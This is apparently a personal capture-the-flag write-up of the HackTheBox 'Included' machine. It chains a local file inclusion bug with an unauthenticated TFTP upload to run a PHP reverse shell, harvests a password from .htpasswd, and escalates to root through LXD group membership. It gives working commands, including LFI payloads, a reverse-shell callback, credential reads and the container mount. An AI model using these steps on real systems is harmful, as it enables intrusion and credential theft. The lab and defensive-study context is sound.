# Included

**Platform:** HackTheBox -- Starting Point Tier 2
**OS:** Linux
**Difficulty:** Easy
**Date:** 2026-07-21

---

## Summary

Linux box running Apache on HTTP and TFTP on UDP. The web application loads pages via a `?file=` parameter vulnerable to Local File Inclusion (LFI). TFTP runs with no authentication, allowing file uploads. A PHP reverse shell is uploaded via TFTP and executed via LFI, giving a shell as `www-data`. Credential harvesting from `.htpasswd` in the web root reveals Mike's password, allowing lateral movement. Mike is in the `lxd` group -- an Alpine container is imported, the host filesystem is mounted into it, and root access is obtained via the container.

---

## What We Didn't Know Before vs What We Know Now

| Before | After |
|--------|-------|
| Didn't know LFI could be identified by URL parameters like `?file=` | Any parameter that looks like it's loading a file is a candidate for LFI -- test immediately with `/etc/passwd` |
| Didn't know lxd group membership is a privesc vector | lxd group = can create containers and mount host filesystem = effectively root on the host |

---

## Recon

Started with our usual TCP scan:

```bash
nmap -sV -sC -p- --min-rate 5000 <ip>
```

**Flags:**
- `-sV` -- service version detection
- `-sC` -- default script scan
- `-p-` -- all 65535 ports
- `--min-rate 5000` -- minimum packet rate for speed

Returns port 80/TCP running HTTP Apache 2.4.29 along with a number of other dynamic TCP ports.

TCP came back with HTTP as the main lead. Since we had a web server and potentially other services, we also ran a UDP scan to check for anything missed:

```bash
sudo nmap -sU -sC --top-ports 20 <ip>
```

**Flags:**
- `-sU` -- UDP scan mode
- `-sC` -- default script scan
- `--top-ports 20` -- scan top 20 most common UDP ports only -- UDP is slow so we limit scope

**UDP results:**
- 68/UDP -- DHCP client
- 69/UDP -- TFTP

**Two leads identified:**
1. Apache 2.4.29 on port 80 -- web application to enumerate
2. TFTP on UDP 69 -- no authentication, potential file upload vector

---

## Enumeration

### Web Application -- LFI Discovery

Visiting the web app, the URL loads `home.php` via a `?file=` parameter. Any parameter that looks like it's loading a file is a candidate for LFI -- this immediately stood out.

Modified the parameter to test:

```bash
curl 'http://<ip>/?file=/etc/passwd'
```

Got a successful return -- the full contents of `/etc/passwd` were returned, confirming LFI.

**Analysing the `/etc/passwd` output:**

The root password field shows `x` -- this is a placeholder meaning the actual hash is stored in `/etc/shadow`, not here. More importantly, scanning through the users we spot a `tftp` service account. TFTP provides file transfer with no authentication -- this is significant.

**The attack chain becomes clear:**
- TFTP is open with no auth -- we can upload files
- The TFTP service account entry in `/etc/passwd` shows its home directory: `/var/lib/tftpboot/` -- this is where uploaded files land
- LFI lets us include and execute any file on the filesystem
- Plan: upload a PHP reverse shell via TFTP, execute it via LFI

---

## Foothold

### Preparing the PHP Reverse Shell

Kali ships with a pre-built PHP reverse shell. Copy it to our working directory rather than modifying the original:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /home/kali/transfer/
```

Edit two lines to point back to our machine:

```php
$ip = '<tun0_ip>';
$port = 443;
```

### Uploading via TFTP

TFTP has no authentication -- upload the shell directly using curl's `-T` upload flag:

```bash
curl -T php-reverse-shell.php tftp://<ip>/
```

**Flags:**
- `-T` -- upload/transfer a file using the protocol specified in the URL prefix (`tftp://`)

The file lands at `/var/lib/tftpboot/php-reverse-shell.php` -- confirmed from the `/etc/passwd` output earlier.

### Setting Up the Listener

Before triggering the shell, start the netcat listener:

```bash
nc -lvnp 443
```

**Flags:**
- `-l` -- listen mode
- `-v` -- verbose
- `-n` -- no DNS resolution
- `-p` -- port to listen on

### Executing via LFI

Now chain the two vulnerabilities -- use LFI to include and execute the uploaded PHP shell:

```bash
curl 'http://<ip>/?file=/var/lib/tftpboot/php-reverse-shell.php'
```

Netcat catches the reverse shell. Connection established.

---

## Post-Foothold Enumeration

### Identity Check

```bash
whoami
# www-data
```

We're the web server user -- no root, no real user access. Need to find credentials to laterally move to Mike or find a direct privesc path.

### Credential Harvesting

Following our priority checklist -- `www-data` lives in the web root so credentials in config files is the highest yield first check. Ran our post-foothold enumeration drill:

```bash
grep -r "pass*" /var/www/html/ 2>/dev/null
```

**Flags:**
- `-r` -- recursive, search all subdirectories
- `2>/dev/null` -- redirect stderr to suppress permission errors

This was run independently without the guide. Returns two interesting files:
- `.htaccess` -- Apache directory configuration
- `.htpasswd` -- Apache password file

`.htpasswd` contains Mike's credentials:
- Username: `mike`
- Password: `Sheffield19`

### Shell Upgrade

Attempting `su mike` immediately fails -- `su` requires an interactive TTY and a basic reverse shell doesn't have one. Upgrade the shell first:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Lateral Movement

```bash
su mike
# Password: Sheffield19
```

Successfully laterally moved to Mike. User flag found at `/home/mike/user.txt`.

---

## Privilege Escalation

### Identifying the Vector

Standard first privesc check -- run `id` to see group memberships:

```bash
id
```

Mike is part of the `lxd` group. A quick search reveals lxd group membership is a known privesc vector -- members can create privileged containers and mount the host filesystem, giving effective root access on the host.

Researched this independently via HackTricks (`lxd group privilege escalation`) and followed their steps without reading the box guide.

### Transferring the Alpine Image

HackTricks requires downloading a minimal Alpine Linux image. Downloaded both required files on Kali, then used our standard HTTP server transfer method:

```bash
# On Kali -- serve from transfer directory
cd /home/kali/transfer
python3 -m http.server 8000
```

**Flags:**
- `-m http.server` -- Python's built-in HTTP server module
- `8000` -- port to serve on

```bash
# On target -- download both files
wget http://<tun0_ip>:8000/lxd.tar.xz
wget http://<tun0_ip>:8000/rootfs.squashfs
```

### Importing the Image

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
```

Verify the import succeeded:

```bash
lxc image list
```

Alpine image is listed -- import confirmed.

### Creating the Container

```bash
lxc init alpine privesc -c security.privileged=true
```

**Flags/arguments:**
- `alpine` -- the image to create the container from
- `privesc` -- name given to the container
- `-c security.privileged=true` -- creates a privileged container, required to mount the host filesystem

Verify the container was created:

```bash
lxc list
```

Container `privesc` is listed with status `STOPPED`.

### Mounting the Host Filesystem

Following the HackTricks config command to mount the entire host filesystem into the container:

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

**Arguments:**
- `privesc` -- the container to configure
- `host-root` -- label given to this device
- `disk` -- device type
- `source=/` -- mount the entire host filesystem root
- `path=/mnt/root` -- where inside the container the host filesystem will be accessible
- `recursive=true` -- include all subdirectories and files

### Getting Root

Start the container and get a shell inside it:

```bash
lxc start privesc
lxc exec privesc /bin/sh
```

```bash
whoami
# root
```

We have root inside the container. Navigate to the mount point to access the real host filesystem:

```bash
cd /mnt/root
ls
```

The entire host filesystem is here. Navigate to root's home directory:

```bash
cd root
cat root.txt
```

Root flag retrieved. `/mnt/root/root/` is the host's actual `/root/` directory -- we're reading the real filesystem, not a copy.

---

## Tools Used

- nmap
- curl
- TFTP (via curl `-T`)
- php-reverse-shell.php (PentestMonkey -- pre-installed on Kali at `/usr/share/webshells/php/`)
- netcat
- python3 pty (shell upgrade)
- python3 http.server (file transfer)
- wget
- lxc (LXD container management)

---

## Key Takeaways

**What would have stopped this:**
- Input sanitisation on the `?file=` parameter would have prevented LFI
- TFTP should not be internet-facing -- no authentication means anyone can upload files
- `.htpasswd` should not be in a web-accessible directory
- Mike should not be in the `lxd` group -- lxd group membership is functionally equivalent to root access
- Containers should never be run with `security.privileged=true` in production

**Attack chain summary:**
TFTP (upload vector) + LFI (execution vector) = foothold. Neither alone gives a shell -- chaining two individually limited vulnerabilities creates full code execution. The key insight was reading `/etc/passwd` output carefully -- the `tftp` service account entry revealed both that TFTP was running and where uploaded files land.

**Independent findings this box:**
- LFI identified and confirmed without guide
- TFTP upload path identified from `/etc/passwd` output without guide
- `.htpasswd` found via manual grep without guide
- Privesc path researched independently via HackTricks lxd page

**Post-foothold checklist additions:**
- Always grep for `.htpasswd` in web root
- `su` requires TTY -- always upgrade shell first with python3 pty before attempting su
- Read `/etc/passwd` output carefully -- service account entries reveal running services and their file paths
- After confirming LFI, try `/etc/shadow` and `/home/<user>/.ssh/id_rsa` next